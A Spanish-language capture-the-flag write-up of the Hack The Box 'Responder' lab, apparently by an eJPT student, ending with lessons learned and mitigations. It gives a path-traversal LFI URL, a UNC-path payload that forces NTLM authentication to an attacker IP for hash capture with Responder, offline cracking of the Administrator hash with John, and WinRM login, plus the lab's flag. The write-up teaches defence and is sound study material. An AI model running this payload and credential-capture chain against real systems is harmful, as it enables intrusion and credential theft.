# Responder — Hack The Box

| Campo      | Detalle         |
|------------|-----------------|
| Plataforma | Hack The Box     |
| Dificultad | Very Easy        |
| SO         | Windows          |
| Categoría  | Web, NTLM, Hash Cracking |
| Estado     | Completada       |

---

## Resumen

Máquina Windows con un servidor web Apache que expone un parámetro `page` vulnerable a Local File Inclusion (LFI). La vulnerabilidad se extiende a la carga de rutas UNC (SMB), lo que permite forzar una autenticación NTLM hacia un servidor controlado por el atacante. Mediante Responder se captura el hash NetNTLMv2 del usuario `Administrator`, que se crackea offline con John the Ripper y rockyou.txt. La contraseña obtenida permite acceso remoto vía Evil-WinRM al puerto 5985.

---

## Reconocimiento

Escaneo de puertos con detección de versiones y velocidad mínima aumentada:

```bash
nmap -sV -p- --min-rate 1000 <IP>
```

**Resultado relevante:**

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Puerto 80: servidor web Apache con PHP sobre Windows.  
Puerto 5985: WinRM, protocolo de administración remota de Windows.

El dominio no resuelve por defecto. Se añade la entrada al archivo de hosts:

```bash
echo "10.129.66.185 unika.htb" | sudo tee -a /etc/hosts
```

---

## Enumeración

Al acceder a `http://unika.htb` se observa un sitio web estático con selector de idioma. Al cambiar de idioma la URL refleja:

```
http://unika.htb/index.php?page=french.html
```

El parámetro `page` carga archivos del sistema de forma dinámica, lo que sugiere una vulnerabilidad de tipo LFI.

**Verificación de LFI mediante path traversal:**

```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

El contenido del archivo `hosts` del sistema se muestra en el navegador, confirmando la vulnerabilidad.

---

## Explotación

### Vulnerabilidad: LFI con carga de rutas UNC (NTLM Relay vía SMB)

En la configuración de PHP, `allow_url_include` y `allow_url_fopen` están desactivados por defecto, lo que impide la carga de URLs remotas HTTP o FTP. Sin embargo, PHP no bloquea la carga de rutas UNC (`\\servidor\recurso`), lo que permite forzar una autenticación NTLM hacia un servidor controlado por el atacante.

### Captura del hash con Responder

Se clona Responder en la máquina atacante:

```bash
git clone https://github.com/lgandx/Responder
cd Responder
```

Se verifica que SMB está habilitado en `Responder.conf` y se lanza escuchando en la interfaz VPN:

```bash
sudo python3 Responder.py -I tun0
```

Se fuerza la autenticación NTLM desde el navegador cargando una ruta UNC apuntando a la IP del atacante:

```
http://unika.htb/?page=//10.10.17.55/somefile
```

Responder captura el hash NetNTLMv2:

```
Administrator::RESPONDER:ae1677b143bb55e2:9059BCD02741078B44E229F384F91660:01010000000000008074D50B1C07DD01380505A9ED5B3B09000000000200080047005A004300390001001E00570049004E002D005700390043005200480041003600580052004300540004003400570049004E002D00570039004300520048004100360058005200430054002E0047005A00430039002E004C004F00430041004C000300140047005A00430039002E004C004F00430041004C000500140047005A00430039002E004C004F00430041004C00070008008074D50B1C07DD010600040002000000080030003000000000000000010000000020000050D7C50A342E8E4279DF95AA7122xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Crackeo del hash con John the Ripper

El hash se guarda en un archivo y se ataca con el diccionario rockyou:

```bash
echo "<hash_completo>" > hash.txt
john --wordlist=~/rockyou.txt hash.txt
```

**Resultado:**

```
badminton        (Administrator)
```

### Acceso remoto con Evil-WinRM

Con las credenciales obtenidas se accede al sistema mediante WinRM (puerto 5985):

```bash
evil-winrm -i 10.129.66.185 -u administrator -p badminton
```

Acceso confirmado como `Administrator`.

---

## Resultado

Sesión remota establecida como `Administrator` en la máquina objetivo.

---

## Flag

```
ea81b7afddd03efaa0945333ed147fac
```

Obtenida en:

```powershell
type C:\Users\mike\Desktop\flag.txt
```

---

## Lecciones aprendidas

- Un parámetro `page` que carga archivos sin sanitización es un vector de LFI directo.
- PHP bloquea URLs HTTP/FTP remotas pero no rutas UNC, lo que abre la puerta a capturas NTLM sin necesidad de RCE.
- NetNTLMv2 no es reversible directamente pero es vulnerable a ataques de diccionario offline. Contraseñas débiles como `badminton` caen en segundos con rockyou.
- WinRM en el puerto 5985 es un vector de acceso crítico cuando se dispone de credenciales válidas.

---

## Mitigación

**LFI / carga de rutas UNC:**

```php
// Validar que el parámetro page solo acepte valores permitidos
$allowed_pages = ['english.html', 'french.html', 'german.html'];
$page = $_GET['page'] ?? 'english.html';

if (!in_array($page, $allowed_pages)) {
    die('Página no permitida.');
}

include($page);
```

**NTLM sobre SMB:**
- Deshabilitar autenticación NTLM en la política de grupo cuando no sea necesaria.
- Bloquear tráfico SMB saliente (puerto 445) en el firewall perimetral.
- Requerir contraseñas con longitud y complejidad mínimas para resistir ataques de diccionario.

---

## Herramientas utilizadas

| Herramienta   | Uso                                      |
|---------------|------------------------------------------|
| nmap          | Reconocimiento de puertos y servicios    |
| Responder     | Captura de hash NetNTLMv2 vía SMB        |
| John the Ripper | Crackeo offline del hash              |
| Evil-WinRM    | Acceso remoto autenticado vía WinRM      |
| rockyou.txt   | Diccionario para ataque de contraseña    |

---

*Parte del camino hacia la certificación eJPT — documentando el progreso desde cero.*
